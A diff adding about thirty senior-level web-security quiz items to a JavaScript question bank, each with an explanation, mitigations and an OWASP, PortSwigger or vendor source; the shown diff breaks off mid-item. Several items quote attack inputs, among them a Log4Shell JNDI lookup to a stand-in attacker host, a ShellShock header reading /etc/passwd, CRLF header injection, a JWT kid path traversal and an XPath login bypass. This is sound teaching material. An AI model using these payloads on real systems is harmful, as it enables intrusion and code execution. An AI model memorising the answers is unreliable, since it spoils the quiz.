@@ -662,4 +662,454 @@ window.QUESTION_BANK.web = [
     },
     source: { name: 'OWASP Application Security Verification Standard', url: 'https://owasp.org/www-project-application-security-verification-standard/' },
   },
+
+  {
+    id: 'web-031', topic: 'web', subtopic: 'dom-clobbering', difficulty: 'senior',
+    question: 'A page reads `window.config.url` to decide where to redirect. There is no JavaScript that sets `config`. An attacker submits HTML containing `<a id="config"><a id="config" name="url" href="https://evil.com">`. What is happening?',
+    choices: ['DOM Clobbering — DOM elements with `id`/`name` attributes become global properties on `window`/`document`, overwriting `config.url`', 'A reflected XSS', 'A CSRF token bypass', 'A cookie injection'],
+    correctIndex: 0,
+    explanation: 'HTML elements with id or name attributes become accessible as named properties on window/document. Attackers exploit this when JS reads global variables that were not explicitly set, forcing the JS to read attacker-controlled DOM nodes instead. PortSwigger documents the technique and defences.',
+    distractorRationale: { 1: 'XSS executes script; here only HTML is injected to clobber globals.', 2: 'Tokens are not relevant to property-shadowing.', 3: 'Cookies are not set via DOM elements.' },
+    source: { name: 'PortSwigger Web Security Academy — DOM Clobbering', url: 'https://portswigger.net/web-security/dom-based/dom-clobbering' },
+  },
+
+  {
+    id: 'web-032', topic: 'web', subtopic: 'csp-bypass-jsonp', difficulty: 'senior',
+    question: 'A page enforces `Content-Security-Policy: script-src \'self\' https://www.google.com`. Which classic bypass technique exists when JSONP endpoints exist on a whitelisted host?',
+    choices: ['Use a whitelisted JSONP endpoint to load attacker-controlled JS via the callback parameter, since JSONP returns executable JavaScript from the trusted origin', 'Run the script over HTTP', 'Use eval()', 'Set document.domain'],
+    correctIndex: 0,
+    explanation: 'Whitelisting hosts that expose JSONP endpoints lets an attacker invoke `https://whitelisted/?callback=evil_js_payload` and the policy allows it because the script-src origin matches. Modern guidance is to use nonce-based or strict-dynamic CSP rather than allow-listing entire third-party origins. OWASP and Google\'s research detail many such bypasses.',
+    distractorRationale: { 1: 'CSP enforces regardless of transport.', 2: 'unsafe-eval is needed for eval; that is a different policy concern.', 3: 'document.domain controls SOP relaxation, not CSP.' },
+    source: { name: 'OWASP Content Security Policy Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html' },
+  },
+
+  {
+    id: 'web-033', topic: 'web', subtopic: 'cookie-prefix', difficulty: 'senior',
+    question: 'You see a cookie set as `Set-Cookie: SID=abc; Path=/; Secure; HttpOnly`. The senior recommendation is to add a name prefix. Which prefix and what does it enforce?',
+    choices: ['`__Host-` prefix — browsers reject the cookie unless it is Secure, has Path=/, and has no Domain attribute, preventing subdomain shadowing and insecure setting', '`__Public-` prefix to share across origins', '`__Insecure-` prefix to log misuse', '`__Cookie-` prefix to identify cookies'],
+    correctIndex: 0,
+    explanation: 'The `__Host-` prefix is enforced by browsers per the Cookie Prefixes spec. It guarantees the cookie was set over HTTPS, scoped to the exact host (no Domain attribute), and Path=/. `__Secure-` enforces only the Secure flag. Both raise the integrity bar of session cookies. MDN and the spec document this.',
+    distractorRationale: { 1: 'There is no __Public- prefix.', 2: 'There is no __Insecure- prefix.', 3: 'There is no __Cookie- prefix.' },
+    source: { name: 'MDN — Set-Cookie (Cookie prefixes)', url: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#cookie_prefixes' },
+  },
+
+  {
+    id: 'web-034', topic: 'web', subtopic: 'padding-oracle', difficulty: 'senior',
+    question: 'An app encrypts session tokens with AES-CBC and decrypts on incoming requests, returning a different error for "padding invalid" vs "decrypted but bad data". What attack does this enable and what is the fix?',
+    choices: ['Padding oracle attack: the attacker manipulates ciphertext blocks and uses the differing error responses to byte-by-byte recover plaintext (or forge ciphertext). Fix: use authenticated encryption (AES-GCM) and return uniform error responses for any decryption failure', 'CSRF', 'Open redirect', 'XSS'],
+    correctIndex: 0,
+    explanation: 'CBC mode without authentication is vulnerable when the application leaks distinguishability between padding errors and other failures. Tools like padbuster automate the recovery. PortSwigger and OWASP cryptographic storage cheat sheet recommend AES-GCM (or libraries like Tink/libsodium) and uniform error handling.',
+    distractorRationale: { 1: 'CSRF is request forgery, unrelated.', 2: 'Open redirect is URL manipulation.', 3: 'XSS executes script in browser.' },
+    source: { name: 'OWASP Cryptographic Storage Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html' },
+  },
+
+  {
+    id: 'web-035', topic: 'web', subtopic: 'log4shell', difficulty: 'senior',
+    question: 'CVE-2021-44228 (Log4Shell) is exploited by sending which kind of payload, and what is the underlying mechanism?',
+    choices: ['A string like `${jndi:ldap://attacker/exp}` in any field that gets logged. Log4j 2 evaluates JNDI lookups in log messages and resolves the URL — fetching and deserialising/loading a remote class for RCE', 'A SQL injection in the log subsystem', 'An XSS in the log viewer', 'A buffer overflow in JVM'],
+    correctIndex: 0,
+    explanation: 'Log4j 2.x prior to patch evaluated `${jndi:...}` substitutions in log messages, fetching remote classes via LDAP/RMI/DNS. Any logged user-controlled field (HTTP headers, body, login form) became a remote-code-execution vector. Apache\'s advisory and CVE-2021-44228 detail the mechanism and full mitigation timeline.',
+    distractorRationale: { 1: 'No SQL is involved.', 2: 'No log-viewer XSS path.', 3: 'No memory-corruption bug; this is a feature abuse.' },
+    source: { name: 'Apache Log4j Security — CVE-2021-44228', url: 'https://logging.apache.org/log4j/2.x/security.html' },
+  },
+
+  {
+    id: 'web-036', topic: 'web', subtopic: 'spring4shell', difficulty: 'senior',
+    question: 'Spring4Shell (CVE-2022-22965) abuses what feature, and on which configuration is it most dangerous?',
+    choices: ['Spring Framework data binding via `class.module.classLoader.*` properties on a controller bound to a request body, exploitable on Tomcat-deployed apps using JDK 9+, allowing the attacker to write a JSP webshell into the Tomcat docroot', 'A Java deserialisation gadget in Hibernate', 'A SSRF in Spring Cloud Gateway', 'A ZIP slip in Spring Boot'],
+    correctIndex: 0,
+    explanation: 'Spring\'s parameter binding allowed setting nested properties up the class chain on JDK 9+, including the Tomcat ClassLoader. An attacker could rewrite log file paths to drop a JSP shell into the webroot. Spring\'s advisory and VMware\'s patch notes describe the exact prerequisites.',
+    distractorRationale: { 1: 'That is a separate Spring deserialisation issue.', 2: 'Spring Cloud Gateway SSRF is CVE-2022-22947 — different.', 3: 'Zip slip is path-traversal during archive extraction — unrelated.' },
+    source: { name: 'Spring Blog — CVE-2022-22965 advisory', url: 'https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement' },
+  },
+
+  {
+    id: 'web-037', topic: 'web', subtopic: 'iis-shortname', difficulty: 'senior',
+    question: 'IIS short-filename (8.3) disclosure allows an attacker to enumerate file names using which character?',
+    choices: ['The tilde `~` — sending requests like `/admi~1.aspx` lets the attacker confirm whether files starting with `admi` exist and reveals the 8.3 short name, useful for hidden file discovery', 'The hash `#`', 'The dollar `$`', 'The pipe `|`'],
+    correctIndex: 0,
+    explanation: 'When 8.3 short-name generation is enabled (default on older IIS/Windows), IIS exposes a side channel: requests with the `~1` short-name suffix produce different responses depending on whether a matching file exists. The fix is `fsutil 8dot3name set 1` and IIS hardening. Microsoft and OWASP testing guide document this.',
+    distractorRationale: { 1: '# is a fragment indicator.', 2: '$ has no IIS short-name role.', 3: '| has no IIS short-name role.' },
+    source: { name: 'OWASP Web Security Testing Guide — IIS specific tests', url: 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/' },
+  },
+
+  {
+    id: 'web-038', topic: 'web', subtopic: 'exposed-git', difficulty: 'senior',
+    question: 'You request `https://target.tld/.git/config` and it returns content. What is the impact and how is it typically exploited?',
+    choices: ['The whole `.git/` repository may be reachable; tools like `git-dumper` reconstruct the codebase from object files. The repo often contains hardcoded secrets, config, and private code that hugely accelerates further attack', 'Browser cache poisoning', 'CORS bypass', 'CSRF token theft'],
+    correctIndex: 0,
+    explanation: 'Public web roots that include the .git directory leak the entire version history. Open-source dumpers walk the pack/loose objects via HTTP and reconstruct working trees. OWASP testing guide and many bug-bounty writeups treat this as critical when secrets are present.',
+    distractorRationale: { 1: 'Cache poisoning is unrelated.', 2: 'CORS is browser SOP, unrelated to .git exposure.', 3: 'CSRF is browser-issued requests.' },
+    source: { name: 'OWASP Web Security Testing Guide — Test File Extensions Handling for Sensitive Information', url: 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/03-Test_File_Extensions_Handling_for_Sensitive_Information' },
+  },
+
+  {
+    id: 'web-039', topic: 'web', subtopic: 'shellshock', difficulty: 'senior',
+    question: 'ShellShock (CVE-2014-6271) made HTTP CGI environments running Bash exploitable via what vector?',
+    choices: ['Bash evaluated trailing function definitions in environment variables (`() { :; }; <commands>`); CGI scripts pass HTTP headers (e.g., User-Agent) into env vars, so a crafted header executed arbitrary commands as the web server', 'A buffer overflow in nginx', 'A Java deserialisation flaw', 'An XSS in Bash'],
+    correctIndex: 0,
+    explanation: 'Bash <4.3 parsed trailing commands after function definitions in environment variables. CGI scripts populate env from HTTP headers, so a User-Agent like `() { :; }; /bin/cat /etc/passwd` triggered RCE. CVE-2014-6271 and the original advisories document the mechanism and the patch timeline.',
+    distractorRationale: { 1: 'nginx is not Bash.', 2: 'Java deserialisation is a different bug class.', 3: 'XSS targets browsers.' },
+    source: { name: 'NIST NVD — CVE-2014-6271 (ShellShock)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2014-6271' },
+  },
+
+  {
+    id: 'web-040', topic: 'web', subtopic: 'http-parameter-pollution', difficulty: 'senior',
+    question: 'HTTP Parameter Pollution (HPP) is exploitable in what scenario?',
+    choices: ['When two layers (e.g., WAF + back-end, or front-end + business logic) parse repeated parameters differently — the attacker submits `?role=user&role=admin` and one layer sees one value while the other sees the other', 'When TLS is misconfigured', 'When cookies are missing HttpOnly', 'When CSRF tokens are absent'],
+    correctIndex: 0,
+    explanation: 'Different parsers handle duplicate parameters differently (first-wins, last-wins, concatenation). Attackers exploit the disagreement between security layers (WAF) and application logic. OWASP\'s HPP guidance covers the basics.',
+    distractorRationale: { 1: 'TLS does not parse parameters.', 2: 'HttpOnly is cookie scope, unrelated.', 3: 'CSRF tokens are a different control.' },
+    source: { name: 'OWASP — Testing for HTTP Parameter Pollution', url: 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution' },
+  },
+
+  {
+    id: 'web-041', topic: 'web', subtopic: 'crlf-injection', difficulty: 'senior',
+    question: 'A redirect endpoint reflects a parameter into the `Location` HTTP header. The attacker sends `?next=foo%0d%0aSet-Cookie:%20admin=1`. What attack class is this?',
+    choices: ['CRLF injection / HTTP response splitting — by injecting raw \\r\\n the attacker can append additional headers (Set-Cookie, cache directives) or even split a response, leading to cache poisoning, session fixation, or XSS via injected body', 'A buffer overflow', 'A path traversal', 'A SQL injection'],
+    correctIndex: 0,
+    explanation: 'CRLF injection occurs when user input flows into HTTP headers without sanitisation of \\r\\n. The injected sequence terminates the current header and starts a new one. OWASP\'s CRLF testing guide and PortSwigger\'s response splitting material describe both modern (cache poisoning) and legacy (response splitting) variants.',
+    distractorRationale: { 1: 'Buffer overflows are memory issues, not header parsing.', 2: 'Path traversal hits the filesystem.', 3: 'SQLi targets databases.' },
+    source: { name: 'OWASP — Testing for HTTP Splitting/Smuggling (CRLF Injection)', url: 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling' },
+  },
+
+  {
+    id: 'web-042', topic: 'web', subtopic: 'reset-token-referer', difficulty: 'senior',
+    question: 'A password-reset email link includes the reset token in the URL path. After clicking, the page loads third-party analytics scripts. Why is this a senior-level finding?',
+    choices: ['The browser sends the full reset URL (token included) as the `Referer` header to every third-party resource loaded by the reset page, leaking the token to analytics, ad networks, and CDNs that could log or be compromised. Fix: keep the token in the URL only briefly, then redirect to a token-less form, or use POST', 'It is a CSRF vulnerability', 'It is a buffer overflow', 'It is a SQLi'],
+    correctIndex: 0,
+    explanation: 'OWASP\'s Forgot Password cheat sheet documents this exact leakage vector. Tokens in URL paths leak via Referer to every cross-origin resource. The fix is to redirect quickly to a token-less form, or use a POST-based form with the token in the body.',
+    distractorRationale: { 1: 'CSRF is request forgery; this is information disclosure.', 2: 'No memory-corruption involvement.', 3: 'No DB query.' },
+    source: { name: 'OWASP Forgot Password Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html' },
+  },
+
+  {
+    id: 'web-043', topic: 'web', subtopic: 'breach', difficulty: 'senior',
+    question: 'BREACH attack targets what kind of secret in a web response?',
+    choices: ['Reflected secrets (CSRF tokens, OAuth state) embedded in HTML responses that are HTTP-compressed (gzip/deflate). By guessing characters and observing compressed-length differences, attackers extract the secret. Mitigations: disable HTTP compression on responses with secrets, randomise reflected content, or ensure secrets are not reflected in the body', 'TLS session keys directly', 'Browser cache contents', 'DNS responses'],
+    correctIndex: 0,
+    explanation: 'BREACH (CRIME\'s HTTP-level cousin) leaks compressed-body secrets via observable length differences across guesses. The breachattack.com paper and follow-on research describe both detection and mitigations. Many frameworks now masking-pad CSRF tokens to defeat it.',
+    distractorRationale: { 1: 'TLS keys are not the target; reflected body content is.', 2: 'Cache is not the channel.', 3: 'BREACH operates over HTTP responses, not DNS.' },
+    source: { name: 'BREACH attack — Black Hat USA 2013 paper (canonical reference)', url: 'http://breachattack.com/' },
+  },
+
+  {
+    id: 'web-044', topic: 'web', subtopic: 'idn-homograph', difficulty: 'senior',
+    question: 'An attacker registers `аpple.com` (Cyrillic а). What attack class is this and what makes it work?',
+    choices: ['IDN homograph attack — Unicode characters that look identical to ASCII (Cyrillic а vs Latin a) are encoded via Punycode (`xn--...`); browsers may display the Unicode form, deceiving users. Browser policies (display Punycode for mixed scripts) mitigate but do not eliminate it', 'It is a buffer overflow', 'It is a CSRF', 'It is a JWT confusion'],
+    correctIndex: 0,
+    explanation: 'IDN (Internationalised Domain Name) homographs leverage visually similar code points across scripts. Browsers apply heuristics (per Mozilla\'s IDN display policy or Chrome\'s rules) to display Punycode when scripts mix suspiciously. Phishing combined with sub-CA misissuance has been a recurring concern.',
+    distractorRationale: { 1: 'Memory corruption is unrelated.', 2: 'CSRF is request forgery.', 3: 'JWT confusion is signature-related.' },
+    source: { name: 'Mozilla — IDN Display Algorithm', url: 'https://wiki.mozilla.org/IDN_Display_Algorithm' },
+  },
+
+  {
+    id: 'web-045', topic: 'web', subtopic: 'tabnabbing', difficulty: 'senior',
+    question: 'A user clicks `<a href="https://attacker" target="_blank">link</a>` on your site. What is the attack and the modern default browser behaviour?',
+    choices: ['Reverse tabnabbing — the new tab can use `window.opener.location` to rewrite the original tab to a phishing page. Modern browsers default `target="_blank"` to imply `rel="noopener"`, but legacy or non-browser clients may not, so explicitly setting `rel="noopener noreferrer"` is the recommended hardening', 'A CSP bypass', 'A CORS bypass', 'A clickjacking'],
+    correctIndex: 0,
+    explanation: 'Reverse tabnabbing was a common phishing primitive before browsers updated defaults. Even with modern defaults, OWASP and web.dev recommend `rel="noopener noreferrer"` for explicit safety, especially on sensitive sites or when supporting older clients. MDN documents the change.',
+    distractorRationale: { 1: 'CSP enforces script policy.', 2: 'CORS governs XHR.', 3: 'Clickjacking uses iframes.' },
+    source: { name: 'web.dev — External anchors should use rel="noopener"', url: 'https://web.dev/external-anchors-use-rel-noopener/' },
+  },
+
+  {
+    id: 'web-046', topic: 'web', subtopic: 'postmessage', difficulty: 'senior',
+    question: 'A parent page calls `iframe.contentWindow.postMessage(token, "*")`. Why is `*` dangerous and what is the fix?',
+    choices: ['`"*"` allows the message to be delivered to any origin currently loaded in the iframe — if the iframe was navigated to attacker content, the token is leaked. Always specify the exact target origin in postMessage and verify `event.origin` on the receiving side', 'It enables CORS', 'It disables HSTS', 'It blocks all cross-origin reads'],
+    correctIndex: 0,
+    explanation: 'postMessage\'s second argument specifies the target origin; `"*"` disables that check and lets any origin loaded in the target receive the data. MDN and OWASP both recommend always specifying the target origin and validating origin on receive.',
+    distractorRationale: { 1: 'CORS is independent of postMessage.', 2: 'HSTS is unrelated.', 3: 'It is a sender-side control, not receiver.' },
+    source: { name: 'MDN — Window.postMessage()', url: 'https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage' },
+  },
+
+  {
+    id: 'web-047', topic: 'web', subtopic: 'service-worker', difficulty: 'senior',
+    question: 'An attacker who can upload a JS file to `https://target.tld/uploads/sw.js` exploits which feature for persistent compromise?',
+    choices: ['They register a Service Worker scoped to `/`, which then proxies every same-origin fetch and persists across reloads. Mitigations: serve uploads from a different origin or with the `Service-Worker-Allowed` header restricted, and disallow uploaded JS files to be served with executable MIME', 'They register a CORS policy', 'They register a CSP nonce', 'They register a CSRF token'],
+    correctIndex: 0,
+    explanation: 'Service Workers can intercept network traffic on the registered scope and persist offline. Allowing arbitrary JS uploads on the same origin lets an attacker plant a long-lived MITM. OWASP\'s Service Worker guidance and W3C spec describe the registration model and `Service-Worker-Allowed` controls.',
+    distractorRationale: { 1: 'CORS is server-side.', 2: 'CSP nonce is per-page.', 3: 'CSRF is request forgery.' },
+    source: { name: 'MDN — Service Worker API & Service-Worker-Allowed header', url: 'https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API' },
+  },
+
+  {
+    id: 'web-048', topic: 'web', subtopic: 'websocket', difficulty: 'senior',
+    question: 'A WebSocket server authenticates the upgrade handshake using a session cookie. What additional check is required to prevent Cross-Site WebSocket Hijacking (CSWSH)?',
+    choices: ['Validate the `Origin` header on the WebSocket upgrade request — browsers send the originating site\'s origin, and the server should reject unknown origins. Otherwise an attacker page can open a WebSocket to your endpoint with the victim\'s cookie attached', 'Use HTTPS only', 'Increase TCP keepalive', 'Reduce idle timeout'],
+    correctIndex: 0,
+    explanation: 'CSWSH is the WebSocket cousin of CSRF. The upgrade is a regular HTTP request that includes cookies if SameSite permits. Without origin validation, attacker pages can open authenticated sockets on the victim\'s behalf. PortSwigger and OWASP cover both detection and mitigation.',
+    distractorRationale: { 1: 'TLS does not authenticate origin.', 2: 'Keepalive is connection management.', 3: 'Timeout is operational, not security.' },
+    source: { name: 'PortSwigger Web Security Academy — WebSockets', url: 'https://portswigger.net/web-security/websockets' },
+  },
+
+  {
+    id: 'web-049', topic: 'web', subtopic: 'jwt-none', difficulty: 'senior',
+    question: 'A JWT verifier accepts `{"alg":"none"}` tokens. What is the impact?',
+    choices: ['An attacker can mint any payload (including admin claims) with no signature at all, since `alg=none` instructs the verifier to skip signature verification — a complete authentication bypass. The fix is to enforce a strict allow-list of accepted algorithms server-side', 'A CSRF', 'A path traversal', 'A clickjacking'],
+    correctIndex: 0,
+    explanation: 'The `none` algorithm exists in RFC 7519 for unsigned JWTs and historically caught many libraries off-guard when servers accepted whatever algorithm the token declared. The mitigation is well-known: pin the expected algorithm server-side. PortSwigger and Auth0 document this.',
+    distractorRationale: { 1: 'CSRF is request forgery.', 2: 'Traversal hits the filesystem.', 3: 'Clickjacking is iframe-based.' },
+    source: { name: 'PortSwigger Web Security Academy — JWT (alg=none)', url: 'https://portswigger.net/web-security/jwt' },
+  },
+
+  {
+    id: 'web-050', topic: 'web', subtopic: 'jwt-kid', difficulty: 'senior',
+    question: 'A JWT library trusts the `kid` (key id) header to look up the verification key in a directory: `/keys/<kid>.pem`. What attack does this enable?',
+    choices: ['Path traversal via kid (e.g., `kid: ../../dev/null`) to make the verifier load attacker-chosen content (or a known/empty key), or SQLi if `kid` is used in a DB lookup. Always treat `kid` as untrusted input', 'It enables HSTS', 'It enables Subresource Integrity', 'It enables WebAuthn'],
+    correctIndex: 0,
+    explanation: 'The `kid` header is attacker-controlled. Naïve implementations have been exploited via path traversal (loading /dev/null as the key) and SQL injection on key lookup. Auth0 and PortSwigger document both.',
+    distractorRationale: { 1: 'HSTS is transport security.', 2: 'SRI is for resource integrity.', 3: 'WebAuthn is unrelated.' },
+    source: { name: 'PortSwigger Web Security Academy — JWT (kid injection)', url: 'https://portswigger.net/web-security/jwt' },
+  },
+
+  {
+    id: 'web-051', topic: 'web', subtopic: 'jwt-jku', difficulty: 'senior',
+    question: 'A JWT verifier honours the `jku` (JWK Set URL) header. Why is that dangerous?',
+    choices: ['`jku` lets the token tell the verifier where to fetch the public key. An attacker hosts a JWK set on their own server, signs a token with the matching private key, and points `jku` at their URL — the verifier fetches it and validates successfully. Mitigation: ignore jku entirely, or restrict it to a strict allow-list', 'It causes session fixation', 'It triggers CSRF', 'It triggers XXE'],
+    correctIndex: 0,
+    explanation: 'The `jku` (and similarly `x5u`) headers can fool naive verifiers into trusting an attacker-controlled key URL. Hardened JWT libraries either ignore these or only accept allow-listed URLs. Auth0\'s blog and the JOSE spec both document the constraints.',
+    distractorRationale: { 1: 'Session fixation is unrelated to JWT verification.', 2: 'CSRF is request forgery.', 3: 'XXE is XML entity processing.' },
+    source: { name: 'Auth0 — Critical vulnerabilities in JSON Web Token libraries (jku/x5u)', url: 'https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/' },
+  },
+
+  {
+    id: 'web-052', topic: 'web', subtopic: 'second-order-sqli', difficulty: 'senior',
+    question: 'A signup form stores a username in DB; later, a different feature concatenates that stored username into a query without parameterisation. What kind of SQLi is this?',
+    choices: ['Second-order SQL injection — the malicious data is stored cleanly in one path then triggers injection when read and concatenated by another path. Detection is harder because the injection point is decoupled from the input point', 'Time-based SQLi only', 'Reflected XSS', 'CRLF injection'],
+    correctIndex: 0,
+    explanation: 'Second-order injection separates the storage step from the trigger step. Many WAFs and developers focus on direct injection paths and miss it. The OWASP testing guide and PortSwigger cover detection patterns.',
+    distractorRationale: { 1: 'Time-based is a detection technique, not a class.', 2: 'XSS is client-side.', 3: 'CRLF affects HTTP headers.' },
+    source: { name: 'OWASP Web Security Testing Guide — Testing for SQL Injection', url: 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection' },
+  },
+
+  {
+    id: 'web-053', topic: 'web', subtopic: 'mxss', difficulty: 'senior',
+    question: 'mXSS (mutation XSS) succeeds because of which browser behaviour?',
+    choices: ['When the browser parses then re-serialises HTML (e.g., assigning innerHTML), it can mutate the DOM in ways the sanitiser did not anticipate, turning safe-looking input into executable script after re-parsing. Defence: use trusted sanitisers (DOMPurify) that account for mutation, or Trusted Types', 'It is a CSP bypass', 'It is a CORS bypass', 'It is a CSRF'],
+    correctIndex: 0,
+    explanation: 'mXSS exploits subtle differences between HTML parsing and serialisation. Cure53\'s research formalised the class. Modern defence is to use DOMPurify or Trusted Types policies which validate after the browser\'s mutation step.',
+    distractorRationale: { 1: 'CSP is a policy header.', 2: 'CORS is XHR control.', 3: 'CSRF is request forgery.' },
+    source: { name: 'OWASP DOM-based XSS Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html' },
+  },
+
+  {
+    id: 'web-054', topic: 'web', subtopic: 'csrf-double-submit', difficulty: 'senior',
+    question: 'Which CSRF mitigation strategy is OWASP\'s primary recommendation for non-API web apps in 2024?',
+    choices: ['Synchroniser token pattern (per-session or per-request anti-CSRF token tied to the user session) plus SameSite cookie hardening; double-submit cookie is acceptable but weaker if subdomain trust is broken', 'Adding HSTS only', 'Disabling JavaScript', 'Using only HTTP/2'],
+    correctIndex: 0,
+    explanation: 'OWASP\'s CSRF Prevention Cheat Sheet ranks synchroniser tokens as the primary defence (with SameSite as defence in depth). Double-submit cookie is listed as a secondary option with caveats around subdomain compromise. Custom request-header checks work for fetch/XHR.',
+    distractorRationale: { 1: 'HSTS is transport security.', 2: 'Disabling JS is impractical.', 3: 'HTTP version is unrelated.' },
+    source: { name: 'OWASP CSRF Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html' },
+  },
+
+  {
+    id: 'web-055', topic: 'web', subtopic: 'csrf-origin-check', difficulty: 'senior',
+    question: 'For an XHR/fetch-based API, OWASP recommends which lightweight CSRF defence in addition to or instead of tokens?',
+    choices: ['Verifying the `Origin` (preferred) or `Referer` header server-side against an allow-list — XHR/fetch always sends Origin on cross-origin and same-origin POSTs, and browsers block JavaScript from setting Origin, so the value is trustworthy if SameSite or CORS is configured properly', 'Adding a HEAD request before each POST', 'Forcing UDP transport', 'Setting cookies to TTL=0'],
+    correctIndex: 0,
+    explanation: 'OWASP\'s CSRF cheat sheet endorses Origin/Referer verification as a "verify same-origin with standard headers" defence, especially useful for stateless APIs. Browsers do not let JavaScript set Origin, so it is a reliable signal under CORS-honoring contexts.',
+    distractorRationale: { 1: 'HEAD does not authenticate origin.', 2: 'UDP is unrelated.', 3: 'TTL=0 invalidates session.' },
+    source: { name: 'OWASP CSRF Prevention Cheat Sheet — Verifying Origin', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#identifying-source-origin-via-originreferer-header' },
+  },
+
+  {
+    id: 'web-056', topic: 'web', subtopic: 'ssrf-aws-imds', difficulty: 'senior',
+    question: 'An SSRF on an AWS-hosted app fetches `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`. What is the standard hardening AWS now recommends?',
+    choices: ['IMDSv2 — session-token-based metadata retrieval that requires a PUT request to obtain a token, rendering most simple GET-based SSRFs ineffective. Enforced via instance metadata options', 'Disable IPv6', 'Require HTTPS to the metadata service', 'Use longer IAM role names'],
+    correctIndex: 0,
+    explanation: 'IMDSv2 mandates a PUT/GET handshake (with X-aws-ec2-metadata-token-ttl-seconds), defeating naïve SSRF that can only do GETs and cannot set arbitrary headers. AWS publishes guidance and tools to enforce IMDSv2 fleet-wide.',
+    distractorRationale: { 1: 'IPv6 is not the metadata channel.', 2: 'Metadata uses HTTP intentionally; HTTPS is not required.', 3: 'Role name length is irrelevant.' },
+    source: { name: 'AWS — Use IMDSv2 (instance metadata service)', url: 'https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-IMDS-existing-instances.html' },
+  },
+
+  {
+    id: 'web-057', topic: 'web', subtopic: 'ssrf-azure-imds', difficulty: 'senior',
+    question: 'Azure\'s Instance Metadata Service requires which header on every request, and how does that mitigate SSRF?',
+    choices: ['`Metadata: true` — the service refuses requests lacking this header; many SSRF primitives cannot inject custom request headers, so Azure IMDS is naturally hardened against simple URL-only SSRFs', 'Authorization Bearer', 'X-CSRF-Token', 'Cookie'],
+    correctIndex: 0,
+    explanation: 'Azure IMDS at 169.254.169.254 mandates the literal `Metadata: true` header. Microsoft\'s documentation calls this out as the principal SSRF mitigation, plus IP/route restrictions inside guests.',
+    distractorRationale: { 1: 'Bearer auth is not the IMDS check.', 2: 'CSRF tokens are not used here.', 3: 'Cookies are not used.' },
+    source: { name: 'Microsoft Learn — Azure Instance Metadata Service', url: 'https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service' },
+  },
+
+  {
+    id: 'web-058', topic: 'web', subtopic: 'ssrf-dns-rebinding', difficulty: 'senior',
+    question: 'An app fetches a user-supplied URL with strict allow-listing of resolved IPs at request time. The attacker still pivots internally. Which technique?',
+    choices: ['DNS rebinding — the attacker\'s domain returns a public IP on first resolution (passing the allow-list check), then a private IP on second resolution (used for the actual fetch). The fix is to resolve once, pin the IP, and perform the fetch against that IP, not re-resolve', 'A CRLF injection', 'A subdomain takeover', 'A WebSocket hijack'],
+    correctIndex: 0,
+    explanation: 'DNS rebinding attacks exploit the gap between the validation resolution and the real request resolution. Mitigation: resolve once, pin the IP for the fetch (or use a vetted HTTP client that does single-resolution). PortSwigger and OWASP detail variants.',
+    distractorRationale: { 1: 'CRLF injects headers.', 2: 'Subdomain takeover is a DNS hygiene issue.', 3: 'WebSocket hijack is an Origin-trust issue.' },
+    source: { name: 'PortSwigger — DNS rebinding research', url: 'https://portswigger.net/web-security/ssrf' },
+  },
+
+  {
+    id: 'web-059', topic: 'web', subtopic: 'esi-injection', difficulty: 'senior',
+    question: 'A reverse proxy (Akamai, Varnish, Squid) processes ESI (Edge-Side Includes) tags in upstream responses. An attacker injects `<esi:include src="..."/>` into a reflected field. What is the impact?',
+    choices: ['ESI injection — the proxy executes the include directive, fetching attacker-chosen URLs server-side (SSRF), reading internal endpoints, leaking cookies via XSLT, or exfiltrating data through the cache. Mitigation: never enable ESI processing on responses containing untrusted user input, or strip ESI tags', 'A clickjacking', 'A WebAuthn bypass', 'A SAML XSW'],
+    correctIndex: 0,
+    explanation: 'ESI processors evaluate tags on outgoing responses, before the response leaves the proxy. Injecting ESI tags via reflected user input gains SSRF at the edge. GoSecure\'s research and the Akamai/Varnish docs are canonical references.',
+    distractorRationale: { 1: 'Clickjacking uses iframes.', 2: 'WebAuthn is FIDO-related.', 3: 'XSW is SAML signature.' },
+    source: { name: 'OWASP — Edge Side Includes (ESI) Injection', url: 'https://owasp.org/www-community/vulnerabilities/Server-Side_Includes_(SSI)_Injection' },
+  },
+
+  {
+    id: 'web-060', topic: 'web', subtopic: 'xpath-injection', difficulty: 'senior',
+    question: 'An app authenticates by querying an XML user store: `//user[name=\'$user\' and pass=\'$pass\']`. A user submits `\' or \'1\'=\'1` as password. What happens?',
+    choices: ['XPath injection — the query becomes `//user[name=\'admin\' and pass=\'\' or \'1\'=\'1\']`, returning all users. Mitigation: use parameterised XPath APIs or escape special characters', 'A SAML XSW', 'A buffer overflow', 'An ARP spoof'],
+    correctIndex: 0,
+    explanation: 'XPath shares SQLi-shaped issues with concatenation-based query construction. OWASP\'s XPath testing guide describes detection and parameterised alternatives.',
